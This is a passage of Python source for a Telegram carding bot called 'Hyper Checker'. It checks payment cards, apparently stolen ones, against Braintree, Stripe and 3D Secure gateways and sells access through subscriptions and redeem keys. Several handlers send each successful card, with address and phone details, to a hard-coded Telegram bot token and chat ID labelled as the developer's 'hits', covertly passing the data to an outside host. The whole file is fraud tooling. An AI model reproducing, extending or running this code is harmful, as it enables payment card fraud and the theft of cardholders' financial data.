- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]}</code> - <code{card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @lakshayfr
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acc =  '-1002246001656'
		mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆  
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acb =  '-1002246001656'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='Braintree Auth'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b> HII {name}
  Welcome to Hyper Checker
  
Status-ALIVE

Use /cmds TO KNOW COMMANDS

YOUR CURRENT PLAN IS :  {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
  Welcome to Hyper Checker
  
Status-ALIVE

Use /cmds TO KNOW COMMANDS 

CURRENT {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>OHH ! IT SEEMS LIKE YOUR SUBSRIPTION HAS EXPIRED.</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "LETTING THE MAGIC HAPPEN...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b> MAGICAL APPROVED ✅
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @lakshayfr</b>'''
	msgd=f'''<b>DECLINED ❌
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @lakshayfr</b>'''
	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acc =  '-1002246001656'
		mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆  
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acb =  '-1002246001656'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tlg_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tlg_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.str') or message.text.lower().startswith('/str'))
def respond_to_vbv(message):
	gate='stripe charge'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}

Welcome to Hyper Checker

Status-ALIVE

Use /cmds TO KNOW COMMANDS 

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
SEEMS LIKE YOU DO NOT HAVE A ACTIVE SUBSCRIPTION

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="✨ CHANNEL  ", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>OHH ! IT SEEMS LIKE YOUR SUBSRIPTION HAS EXPIRED.</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "<b> LET THE MAGIC HAPPEN..✨").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(st(cc))
	except Exception as e:
		last='Error'
		print(e)
	try: data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @LAKSHAYFR
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @LAKSHAYFR
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgc=f'''<b>𝑪𝑪𝑵 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @LAKSHAYFR
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @lakshayfr
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'success' in last:
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acc =  '-1002246001656'
		mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆

</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acb =  '-1002246001656'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	elif "funds" in last:
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acc =  '-1002246001656'
		mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆

</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acb =  '-1002246001656'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgf)
	elif "card's security" in last:
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acc =  '-1002246001656'
		mg = f"""<b> 
❆═══» LAKSHAY'S HITS  «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» LAKSHAY'S HITS  «═══❆

</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acb =  '-1002246001656'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgc)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b> DONE You Are Now A Magician  ✅
Magic Ends in ➜ {timer}
𝗧𝗬𝗣 ➜ {typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed , Try Restarting Bot using /start </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='HYPER-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>HERE IS A NEW MAGICAL KEY 🚀
		
STATUS ➜ {plan}
EXPIRES IN ➜ {ig}
MAGICAL WORDS ➜ <code>{pas}</code>
UPDATES: @HyperCheckerUpdates
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3D Lookup'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
YOU DO NOT HAVE A ACTIVE SUBSCRIPTION ! {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
YOU DO NOT HAVE A ACTIVE SUBSCRIPTION ! {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>OHH ! IT SEEMS LIKE YOUR SUBSRIPTION HAS EXPIRED.</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "<b> LET THE MAGIC HAPPEN FOR YOU...✨").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		last= str(vbv(cc))
		if 'result not found' in last:
			last='GATE IS ON MAINTAINCE'
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @lakshayfr
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @lakshayfr
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acc =  '-1002246001656'
		mg = f"""<b> 
❆═══lakshay 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
</b>"""
